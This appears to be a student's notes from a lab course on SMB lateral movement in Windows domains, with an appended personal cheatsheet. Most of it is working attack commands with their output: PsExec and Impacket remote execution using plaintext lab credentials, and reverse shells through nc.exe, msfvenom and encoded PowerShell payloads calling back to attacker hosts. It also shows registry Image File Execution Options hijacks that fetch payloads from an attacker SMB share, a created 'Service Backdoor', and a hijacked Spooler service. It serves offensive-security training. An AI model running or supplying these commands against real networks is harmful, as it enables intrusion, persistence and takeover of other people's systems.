`Server Message Block (SMB)` is a network communication protocol that facilitates the sharing of files, printers, and other resources among computers within a network. It enables users and applications to read and write files, manage directories, and perform different functions on remote servers as if they were local. It also supports transaction protocols for interprocess communication. `SMB` primarily operates on Windows systems but is compatible with other operating systems, making it a key protocol for networked environments.

## SMB Rights

For successful `SMB` lateral movement, we require an account that is a member of the Administrators group on the target computer. It's also crucial that ports TCP `445` and TCP `139` are open. Optionally, port TCP `135` may also need to be open because some tools use it for communication.

#### UAC remote restrictions

`UAC` might prevent us from achieving remote code execution, but understanding these restrictions is crucial for effectively leveraging these tools while navigating UAC limitations on different versions of Windows, these restrictions imply several key points:

- Local admin privileges are necessary.
- Local admin accounts that are not RID 500 cannot run tools such as `PsExec` on Windows Vista and later.
- Domain users with admin rights on a machine can execute tools such as `PsExec`.
- RID 500 local admin accounts can utilize tools such as `PsExec` on machines.
# SMB Enumeration

Before we begin the lateral movement process, we need to ensure that `SMB` is running on the target host. To achieve this we will use `NMAP`.

We must conduct a port scan on the target host to verify whether `SMB` is running on the target. By default, `SMB` uses ports TCP 139 and TCP 445.

```shell-session
BusySec@htb[/htb]$ proxychains4 -q nmap 172.20.0.52 -sV -sC -p139,445 -Pn
Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-08 04:07 UTC
Nmap scan report for srv01.internal.cloudapp.net (172.20.0.51)
Host is up (0.0016s latency).

PORT    STATE SERVICE       VERSION
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: -1s
|_nbstat: NetBIOS name: SRV02, NetBIOS user: <unknown>, NetBIOS MAC: 00:0d:3a:e2:38:3d (Microsoft)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-06-08T04:07:51
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.65 seconds
```

## Lateral Movement From Windows

To execute lateral movement from Windows several tools and techniques can be used. In this section, we will be showing `PSExec`, `SharpNoPSExec`, `NimExec`, and `Reg.exe`. Let's connect via RDP to `SRV01` using helen's credentials:

```shell-session
BusySec@htb[/htb]$ xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.229.244 /dynamic-resolution /drive:.,linux
```

### PSExec

[PsExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec) is included in Microsoft's [Sysinternals suite](https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite), a collection of tools designed to assist administrators in system management tasks. This tool facilitates remote command execution and retrieves output over a named pipe using the `SMB` protocol, operating on TCP port `445` and TCP port `139`.

By default, `PSExec` performs the following action:

1. Establishes a link to the hidden `ADMIN$` share, which corresponds to the `C:\Windows` directory on the remote system, via SMB.
2. Uses the Service Control Manager (SCM) to initiate the `PsExecsvc` service and set up a named pipe on the remote system.
3. Redirects the console’s input and output through the created named pipe for interactive command execution.

**Note:** `PsExec` eliminates the double-hop problem because credentials are passed with the command and generates an interactive logon session (Type 2).

We can use `PsExec` to connect to a remote host and execute commands interactively. We must specify the computer or target where we are connecting `\\SRV02`, the option `-i` for interactive shell, the administrator login credentials with the option `-u <user>` and the password `-p <password>`, and `cmd` to specify the application to execute:

```powershell-session
C:\Tools\SysinternalsSuite> .\PsExec.exe \\SRV02 -i -u INLANEFREIGHT\helen -p RedRiot88 cmd
PsExec v2.43 - Execute processes remotely
Copyright (C) 2001-2023 Mark Russinovich
Sysinternals - www.sysinternals.com

Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami && hostname
inlanefreight\helen
SRV02
```

**Note:** We can execute applications such as `cmd` or `powershell` but we can also specify a command to execute.

In case we want to execute our payload as `NT AUTHORITY\SYSTEM`, we need to specify the option `-s` which means that it will run with `SYSTEM` privileges:


```powershell-session
PS C:\Tools> .\PsExec.exe \\SRV02 -i -s -u INLANEFREIGHT\helen -p RedRiot88 cmd

PsExec v2.43 - Execute processes remotely
Copyright (C) 2001-2023 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

### SharpNoPSExec
[SharpNoPSExec](https://github.com/juliourena/SharpNoPSExec) is a tool designed to facilitate lateral movement by leveraging existing services on a target system without creating new ones or writing to disk, thus minimizing detection risk. The tool queries all services on the target machine, identifying those with a start type set to disabled or manual, current status of stopped, and running with LocalSystem privileges. It randomly selects one of these services and temporarily modifies its binary path to point to a payload of the attacker’s choice. Upon execution, SharpNoPSExec waits approximately 5 seconds before restoring the original service configuration, returning the service to its previous state. This approach not only provides a shell but also avoids the creation of new services, which security monitoring systems could flag.

Executing the tool without parameters we will see some help and usage information.

```powershell-session
PS C:\Tools> .\SharpNoPSExec.exe

███████╗██╗  ██╗ █████╗ ██████╗ ██████╗ ███╗   ██╗ ██████╗ ██████╗ ███████╗███████╗██╗  ██╗███████╗ ██████╗
██╔════╝██║  ██║██╔══██╗██╔══██╗██╔══██╗████╗  ██║██╔═══██╗██╔══██╗██╔════╝██╔════╝╚██╗██╔╝██╔════╝██╔════╝
███████╗███████║███████║██████╔╝██████╔╝██╔██╗ ██║██║   ██║██████╔╝███████╗█████╗   ╚███╔╝ █████╗  ██║
╚════██║██╔══██║██╔══██║██╔══██╗██╔═══╝ ██║╚██╗██║██║   ██║██╔═══╝ ╚════██║██╔══╝   ██╔██╗ ██╔══╝  ██║
███████║██║  ██║██║  ██║██║  ██║██║     ██║ ╚████║╚██████╔╝██║     ███████║███████╗██╔╝ ██╗███████╗╚██████╗
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝

Version: 0.0.3
Author: Julio Ureña (PlainText)
Twitter: @juliourena

Usage:
SharpNoPSExec.exe --target=192.168.56.128 --payload="c:\windows\system32\cmd.exe /c powershell -exec bypass -nop -e ZQBjAGgAbwAgAEcAbwBkACAAQgBsAGUAcwBzACAAWQBvAHUAIQA="

Required Arguments:
--target=       - IP or machine name to attack.
--payload=      - Payload to execute in the target machine.

Optional Arguments:
--username=     - Username to authenticate to the remote computer.
--password=     - Username's password.
--domain=       - Domain Name, if no set a dot (.) will be used instead.

--service=      - Service to modify to execute the payload, after the payload is completed the service will be restored.
Note: If not service is specified the program will look for a random service to execute.
Note: If the selected service has a non-system account this will be ignored.

--help          - Print help information.
```

To perform lateral movement with `SharpNoPSExec`, we will need a listener as this tool will only allow us to execute code on the machine, but it won't give us an interactive shell as `PsExec` does. We can start listening with `Netcat`:


```shell-session
BusySec@htb[/htb]$ nc -lnvp 8080
Listening on 0.0.0.0 8080
```

`SharpNoPSExec` uses the credentials of the console we are executing the command from, so we need to make sure to launch it from a console that has the correct credentials. Alternatively, we can use the arguments `--username`, `--password` and `--domain`. Additionally, we have to provide the target IP address or the domain name `--target=<IP/Domain>`, and the command we want to execute. For the command, we can use the payload shown in the help menu to set our reverse shell `--payload="c:\windows\system32\cmd.exe /c <reverseShell>`. We can generate the reverse shell payload using [https://www.revshells.com](https://www.revshells.com/) or our favorite C2:

```powershell-session
PS C:\Tools> .\SharpNoPSExec.exe --target=172.20.0.52 --payload="c:\windows\system32\cmd.exe /c powershell -exec bypass -nop -e ...SNIP...AbwBzAGUAKAApAA=="

[>] Open SC Manager from 172.20.0.52.

[>] Getting services information from 172.20.0.52.

[>] Looking for a random service to execute our payload.
    |-> Querying service NetTcpPortSharing
    |-> Querying service UevAgentService
    |-> Service UevAgentService authenticated as LocalSystem.

[>] Setting up payload.
    |-> payload = c:\windows\system32\cmd.exe /c ...SNIP...AbwBzAGUAKAApAA==
    |-> ImagePath previous value = C:\Windows\system32\AgentService.exe.
    |-> Modifying ImagePath value with payload.

[>] Starting service User Experience Virtualization Service with new ImagePath.

[>] Waiting 5 seconds to finish.

[>] Restoring service configuration.
    |-> User Experience Virtualization Service Log On => LocalSystem.
    |-> User Experience Virtualization Service status => 4.
    |-> User Experience Virtualization Service ImagePath => C:\Windows\system32\AgentService.exe
```

Looking at the attack box, we can see the reverse shell connection successfully being established:

```shell-session
BusySec@htb[/htb]$ nc -lnvp 8080
Listening on 0.0.0.0 8080
Connection received on 172.20.0.52 49866

PS C:\Windows\system32>
```

### NimExec

[NimExec](https://github.com/frkngksl/NimExec) is a fileless remote command execution tool that operates by exploiting the Service Control Manager Remote Protocol (MS-SCMR). Instead of using traditional `WinAPI` calls, `NimExec` manipulates the binary path of a specified or randomly selected service with LocalSystem privileges to execute a given command on the target machine and later restores the original configuration. This is achieved through custom-crafted RPC packets sent over `SMB` and the `svcctl` named pipe. Authentication is handled using an `NTLM` hash, which `NimExec` utilizes to complete the process via the `NTLM` Authentication method over its custom packets. By manually crafting the necessary network packets and avoiding OS-specific functions, this tool benefits from Nim's cross-compilation capabilities, making it versatile across different operating systems.

Running the tool without parameters give us some commands and descriptions to let us know how to use it.

```powershell-session
PS C:\Tools> .\NimExec.exe

                                                                                             _..._
                                                                                          .-'_..._''.
   _..._   .--. __  __   ___         __.....__                          __.....__       .' .'      '.\
 .'     '. |__||  |/  `.'   `.   .-''         '.                    .-''         '.    / .'
.   .-.   ..--.|   .-.  .-.   ' /     .-''"'-.  `.                 /     .-''"'-.  `. . '
|  '   '  ||  ||  |  |  |  |  |/     /________\   \ ____     _____/     /________\   \| |
|  |   |  ||  ||  |  |  |  |  ||                  |`.   \  .'    /|                  || |
|  |   |  ||  ||  |  |  |  |  |\    .-------------'  `.  `'    .' \    .-------------'. '
|  |   |  ||  ||  |  |  |  |  | \    '-.____...---.    '.    .'    \    '-.____...---. \ '.          .
|  |   |  ||__||__|  |__|  |__|  `.             .'     .'     `.    `.             .'   '. `._____.-'/
|  |   |  |                        `''-...... -'     .'  .'`.   `.    `''-...... -'       `-.______ /
|  |   |  |                                        .'   /    `.   `.                               `
'--'   '--'                                       '----'       '----'

                                            @R0h1rr1m


[!] Missing one or more arguments!
[!] Error unknown or missing parameters!

    -v | --verbose                          Enable more verbose output.
    -u | --username <Username>              Username for NTLM Authentication.*
    -h | --hash <NTLM Hash>                 NTLM password hash for NTLM Authentication.**
    -p | --password <Password>              Plaintext password.**
    -t | --target <Target>                  Lateral movement target.*
    -c | --command <Command>                Command to execute.*
    -d | --domain <Domain>                  Domain name for NTLM Authentication.
    -s | --service <Service Name>           Name of the service instead of a random one.
    --help                                  Show the help message.
```

`Nimexec` works simillary to `SharpNoPSExec`. Let's start our listener using `Netcat`:

```shell-session
BusySec@htb[/htb]$ nc -lvnp 8080
Listening on 0.0.0.0 8080
```

To execute `NimExec`, we must specify the administrator credentials with the options `-u <user>`, `-p <password>` and `-d <domain>`, and the target IP address `-t <ip>`. Alternatively, we can use the NTLM hash for authentication `-h <NT hash>` instead of the password. Finally, we must specify the payload to execute with the option `-c <cmd.exe> /c <reverseShell>`. We can generate the reverse shell payload using [revshells.com](https://revshells.com/), and to convert the plain text password to NTLM hash, we can use this [recipe](https://gchq.github.io/CyberChef/#recipe=NT_Hash\(\)) in CyberChef.

```powershell-session
PS C:\Tools> .\NimExec -u helen -d inlanefreight.local -p RedRiot88 -t 172.20.0.52 -c "cmd.exe /c powershell -e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==" -v

                                                                                             _..._
                                                                                          .-'_..._''.
   _..._   .--. __  __   ___         __.....__                          __.....__       .' .'      '.\
 .'     '. |__||  |/  `.'   `.   .-''         '.                    .-''         '.    / .'
.   .-.   ..--.|   .-.  .-.   ' /     .-''"'-.  `.                 /     .-''"'-.  `. . '
|  '   '  ||  ||  |  |  |  |  |/     /________\   \ ____     _____/     /________\   \| |
|  |   |  ||  ||  |  |  |  |  ||                  |`.   \  .'    /|                  || |
|  |   |  ||  ||  |  |  |  |  |\    .-------------'  `.  `'    .' \    .-------------'. '
|  |   |  ||  ||  |  |  |  |  | \    '-.____...---.    '.    .'    \    '-.____...---. \ '.          .
|  |   |  ||__||__|  |__|  |__|  `.             .'     .'     `.    `.             .'   '. `._____.-'/
|  |   |  |                        `''-...... -'     .'  .'`.   `.    `''-...... -'       `-.______ /
|  |   |  |                                        .'   /    `.   `.                               `
'--'   '--'                                       '----'       '----'

                                            @R0h1rr1m


[+] Connected to 172.20.0.52:445
[+] NTLM Authentication with Hash is succesfull!
[+] Connected to IPC Share of target!
[+] Opened a handle for svcctl pipe!
[+] Binded to the RPC Interface!
[+] RPC Binding is acknowledged!
[+] SCManager handle is obtained!
[+] Number of obtained services: 208
[+] Selected service is AppMgmt
[+] Service: AppMgmt is opened!
[+] Previous Service Path is: C:\Windows\system32\svchost.exe -k netsvcs -p
[+] Service config is changed!
[!] StartServiceW Return Value: 1053 (ERROR_SERVICE_REQUEST_TIMEOUT)
[+] Service start request is sent!
[+] Service config is restored!
[+] Service handle is closed!
[+] Service Manager handle is closed!
[+] SMB is closed!
[+] Tree is disconnected!
[+] Session logoff!
```

Once we execute the tool with the above parameters, we are going successfully establish a reverse shell connection:

```shell-session
BusySec@htb[/htb]$ nc -lvnp 8080
Listening on 0.0.0.0 8080
Connection received on 172.20.0.52 51096

PS C:\Windows\system32>
```

**Note:** The instructions for compiling [NimExec](https://github.com/frkngksl/NimExec) are on GitHub. We will not provide an executable, but we encourage the student to complete the compilation process.

### Reg.exe

Having remote access to the registry with write permissions effectively provides Remote Code Execution (RCE) capabilities. This process utilizes the `winreg` SMB pipe. Typically, the remote registry service is enabled by default only on server-class operating systems.

We can leverage the program launch handler to move laterally on the network, modifying a registry key to a program frequently used on the target host; we could achieve remote code execution almost immediately.

Before we proceed with `reg.exe` for lateral movement, we must set up an SMB server to host our payload. We will be using [nc.exe](https://github.com/int0x33/nc.exe/) as our payload to get a reverse shell:

```shell-session
BusySec@htb[/htb]$ sudo python3 smbserver.py share -smb2support /home/plaintext/nc.exe
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

In our attack host we execute our `Netcat` listener:

```shell-session
BusySec@htb[/htb]$ nc -lnvp 8080
Listening on 0.0.0.0 8080
```

Now, we can execute `reg.exe` to add a new registry key to Microsoft Edge (`msedge.exe`). The idea is that once `msedge.exe` is executed, it will also execute our specified payload. We must specify the full path of the subkey or the entry to be added with the domain name `add \\<domain>\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe`. `/v Debugger` specifies the name of the add registry entry and will ensure that our payload gets executed, `/t reg_sz` specifies the datatype of a Null-terminated string, and finally, we can type our payload `/d <payload>`:

```powershell-session
PS C:\Tools> reg.exe add "\\srv02.inlanefreight.local\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe" /v Debugger /t reg_sz /d "cmd /c copy \\172.20.0.99\share\nc.exe && nc.exe -e \windows\system32\cmd.exe 172.20.0.99 8080"

The operation completed successfully.
```

Once Microsoft Edge is opened by any user in the domain, we will instantly get a reverse shell:

```shell-session
BusySec@htb[/htb]$ nc -lvnp 8080
Listening on 0.0.0.0 8080
Connection received on 172.20.0.52 51096

C:\Program Files (x86)\Microsoft\Edge\Application>
```

It is important to keep in mind that to use SMB share folder without authentication we need to have the following registry key set to `1`:

```powershell-session
PS C:\Tools> reg.exe query HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters
    AllowInsecureGuestAuth    REG_DWORD    0x0
```

The above registry key is responsible for allowing guest access in SMB2 and SMB3 which is disable by default on Windows. If have an account with administrative rights, we can use the following command to allow insecure guest authentication:


```powershell-session
PS C:\Tools> reg.exe add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth /d 1 /t REG_DWORD /f
The operation completed successfully.
```

## Lateral Movement From Linux
To achieve lateral movement from Linux we can use the [Impacket](https://github.com/fortra/impacket) tool set. `Impacket` is a suite of Python libraries designed for interacting with network protocols. It focuses on offering low-level programmatic control over packet manipulation and, for certain protocols like `SMB` and `MSRPC`, includes the protocol implementations themselves.

### Psexec.py

[Psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py) is a great alternative for Linux users. This method is very similar to the traditional `PsExec` tool from SysInternals suite. `psexec.py` creates a remote service by uploading an executable with a random name to the `ADMIN$` share on the target Windows machine. It then registers this service via RPC and the Windows Service Control Manager. Once registered, the tool establishes communication through a named pipe, allowing for the execution of commands and retrieval of outputs on the remote system. Understanding this mechanism is crucial for effectively utilizing the tool and appreciating its role in facilitating remote command execution.

We can use `psexec.py` to get remote code execution on a target host, administrator login credentials are required. We must provide the domain, admin level user, password, and the target IP as follows `<domain>/<user>:<password>@<ip>`:

```shell-session
BusySec@htb[/htb]$ proxychains4 -q psexec.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 172.20.0.52.....
[*] Found writable share ADMIN$
[*] Uploading file sRhFLBbo.exe
[*] Opening SVCManager on 172.20.0.52.....
[*] Creating service KQWG on 172.20.0.52.....
[*] Starting service KQWG.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.5830]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

### smbexec.py
The [smbexec.py](https://github.com/fortra/impacket/blob/master/examples/smbexec.py) method leverages the built-in Windows SMB functionality to run arbitrary commands on a remote system without uploading files, making it a quieter alternative.

Communication occurs exclusively over TCP port 445. It also sets up a service, using only MSRPC for this, and manages the service through the `svcctl` SMB pipe.

To use this tool, we must provide the domain name, administrator user, password, and the target IP address `<domain>/<user>:<password>@<ip>`:

```shell-session
BusySec@htb[/htb]$ proxychains4 -q smbexec.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52
Impacket v0.11.0 - Copyright 2023 Fortra

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>
```

As we can see, we now have established a semi-interactive shell on the host.

### services.py

The [services.py](https://github.com/fortra/impacket/blob/master/examples/services.py) script in Impacket interacts with Windows services using the [MSRPC](https://learn.microsoft.com/en-us/windows/win32/rpc/rpc-start-page) interface. It allows starting, stopping, deleting, reading status, configuring, listing, creating, and modifying services. During Red Teaming assignments, many tasks can be greatly simplified by gaining access to the target machine's services. This technique is non-interactive, meaning that we won't be able to see the results of the actions in real time.

We can view a list of services in the target host, by typing the command `list` after providing the domain name, the administrator account, the password, and target IP address `<domain>/<user>:<password>@<ip>`:



```shell-session
BusySec@htb[/htb]$ proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 list
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Listing services available on target
                      1394ohci -                                    1394 OHCI Compliant Host Controller -  STOPPED
                         3ware -                                                                  3ware -  STOPPED
                          ACPI -                                                  Microsoft ACPI Driver -  RUNNING
                       AcpiDev -                                                    ACPI Devices driver -  STOPPED
                        acpiex -                                                Microsoft ACPIEx Driver -  RUNNING
                      acpipagr -                                       ACPI Processor Aggregator Driver -  STOPPED

...SNIP...

          WpnUserService_7a815 -                          Windows Push Notifications User Service_7a815 -  RUNNING
                          KQWG -                                                                   KQWG -  RUNNING
Total Services: 543
```

To move laterally with this tool, we can set up a new service, modify an existing one, and define a custom command to get a reverse shell.

To create a new service, instead of using the option `list` we will use `create` followed by the name of the new service `-name <serviceName>`, a display name `-display "<Service Display Name>"` and finally we specify the command we want to execute with the option `-path "cmd /c <payload>"`.

For our payload, we will use the Metasploit output option `exe-service`, which creates a service binary:

```shell-session
BusySec@htb[/htb]$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.207 LPORT=9001 -f exe-service -o rshell-9001s.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload                                     
No encoder specified, outputting raw payload   
Payload size: 460 bytes                        
Final size of exe-service file: 48640 bytes    
Saved as: rshell-9001s.exe
```

Now, we can execute the command to create a new service:

```shell-session
BusySec@htb[/htb]$ proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 create -name 'Service Backdoor' -display 'Service Backdoor' -path "\\\\10.10.14.207\\share\\rshell-9001.exe"
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Creating service Service Backdoor
```

We can view the configuration of the custom command created using `config -name <serviceName>`:

```shell-session
BusySec@htb[/htb]$ proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 config -name 'Service Backdoor'
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Querying service config for Service Backdoor
TYPE              : 16 -  SERVICE_WIN32_OWN_PROCESS  
START_TYPE        :  2 -  AUTO START
ERROR_CONTROL     :  0 -  IGNORE
BINARY_PATH_NAME  : \\10.10.14.207\share\rshell-9001.exe
LOAD_ORDER_GROUP  : 
TAG               : 0
DISPLAY_NAME      : Service Backdoor
DEPENDENCIES      : /
SERVICE_START_NAME: LocalSystem
```

Before we run the service, we must ensure that the SMB server has the file that will be executed:

```shell-session
BusySec@htb[/htb]$ sudo smbserver.py share -smb2support ./
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

We must start our `Netcat` listener:

```shell-session
BusySec@htb[/htb]$ nc -lnvp 9001
Listening on 0.0.0.0 9001
```

We can now start the service with `start -name <serviceName>`:

```shell-session
BusySec@htb[/htb]$ proxychains4 -q impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 start -name 'Service Backdoor' 
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Starting service Service Backdoor
```

Looking at our attack host, we have successfully established a reverse shell:

```shell-session
BusySec@htb[/htb]$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.207] from (UNKNOWN) [10.129.229.244] 62855
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Finally, we can cover up the traces and delete the service by typing `delete -name <serviceName>`:

```shell-session
BusySec@htb[/htb]$ proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 delete -name 'Service Backdoor'
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Deleting service Service Backdoor
```

Alternatively, we use `services.py` to modify existing services; for example, if we find a service authenticated as a specific user account, we can change the configuration of that service and make it execute our payload. In the following example, we can modify the `Spooler` service to execute our payload. First, let's see the current service configuration:

```shell-session
BusySec@htb[/htb]$ proxychains4 -q impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 config -name Spooler
Impacket v0.11.0 - Copyright 2023 Fortra                                                                                                                                                      
                                               
[*] Querying service config for Spooler
TYPE              : 272 -  SERVICE_WIN32_OWN_PROCESS  SERVICE_INTERACTIVE_PROCESS                                                                                                             
START_TYPE        :  4 -  DISABLED
ERROR_CONTROL     :  0 -  IGNORE
BINARY_PATH_NAME  : C:\Windows\System32\spoolsv.exe
LOAD_ORDER_GROUP  : SpoolerGroup    
TAG               : 0               
DISPLAY_NAME      : Print Spooler  
DEPENDENCIES      : RPCSS/http/
SERVICE_START_NAME: LocalSystem
```

Next we will modify the binary path to our payload and set the `START_TYPE` to `AUTO START` with the option `-start_type 2`:

```shell-session
BusySec@htb[/htb]$ proxychains4 -q impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 change -name Spooler -path "\\\\10.10.14.207\\share\\rshell-9001.exe" -start_type 2
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Changing service config for Spooler
```

Finally, we can start the service and wait for our command execution:

```shell-session
BusySec@htb[/htb]$ proxychains4 -q impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 start -name Spooler
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Starting service Spooler
```

The advantage of this is that if a service is configured with a specific user account, we can take advantage of that account and impersonate it.

### atexec.py

The [atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py) script utilizes the Windows Task Scheduler service, which is accessible through the `atsvc` SMB pipe. It enables us to remotely append a task to the scheduler, which will execute at the designated time.

With this tool, the command output is sent to a file, which is subsequently accessed via the `ADMIN$` share. For this utility to be effective, it's essential to synchronize the clocks on both the attacking and target PCs down to the exact minute.

We can leverage this tool by inserting a reverse shell on the target host.

Let's start a `Netcat` listener:

```shell-session
BusySec@htb[/htb]$ nc -lnvp 8080
Listening on 0.0.0.0 8080
```

Now let's pass the domain name, administrator user, password, and target IP address `<domain>/<user>:<password>@<ip>`, and lastly, we can pass our reverse shell payload to get executed. We can generate the reverse shell payload using [revshells.com](https://www.revshells.com/).

```shell-session
BusySec@htb[/htb]$ proxychains4 -q atexec.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 "powershell -e ...SNIP...AbwBzAGUAKAApAA=="
Impacket v0.11.0 - Copyright 2023 Fortra

[!] This will work ONLY on Windows >= Vista
[*] Creating task \tEQBXeQm
[*] Running task \tEQBXeQm
[*] Deleting task \tEQBXeQm
[*] Attempting to read ADMIN$\Temp\tEQBXeQm.tmp
```

We have successfully established a reverse shell connection in our attack box:


```shell-session
BusySec@htb[/htb]$ nc -lnvp 8080
Listening on 0.0.0.0 8080
Connection received on 172.20.0.52 50027

PS C:\Windows\system32> 
```


# TODO - Da inserire nello cheatsheet

## Ligolo
download linux and windows agents on the [release](https://github.com/nicocha30/ligolo-ng/releases) page.

### Linux listener
unzip the release folder and start the proxy file
```bash
./proxy -selfcert
```

Create new network interface
```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add <NetMask of target IP> dev ligolo
```

After that we have started the agent on windows machine on the terminal where we have launch the proxy file we can type 
```bash
session
start
```
### Windows
```powershell
.\agent.exe -connect KALI:11601 -ignore-cert
```


## RDP Connection
```
xfreerdp3 /u:helen /p:'RedRiot88' /v:10.129.229.244 /dynamic-resolution /drive:.,linux /bpp:16 /compression -themes -wallpaper /clipboard +clipboard /audio-mode:0
```

## Modify Register to execute code
```bash
reg.exe add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth /d 1 /t REG_DWORD /f
```

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=667 -f exe -o meterpreter.exe
```

Setup the smbshare
```bash
sudo impacket-smbserver share ./ -smb2support
```

Modify the Image File with execution of our payload
```poweshell
reg.exe add "\\srv02.inlanefreight.local\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe" /v Debugger /t reg_sz /d "powershell /c mkdir C:\Temp;Copy-Item \\10.10.15.156\share\ciccio.exe -Destination C:\temp\ciccio.exe;Start-Sleep -Seconds 5;C:\Temp\ciccio.exe"
```

Setup msfconsole listener 
```bash
msfconsole
use multi/handler
```

On target machine start the the internet explore or start manually the process.
```bash
.\PsExec.exe \\SRV02 -i -s -u inlanefreight\helen -p RedRiot88 powershell
```

```bash
 Start-Process "C:\Program Files\Internet Explorer\iexplore.exe"
```

## NimExec

Compile NimExec using nim 

```bash
nimble install ptr_math nimcrypto hostname
```

```bash
nim c -d:release --gc:markAndSweep -o:NimExec.exe Main.nim
```
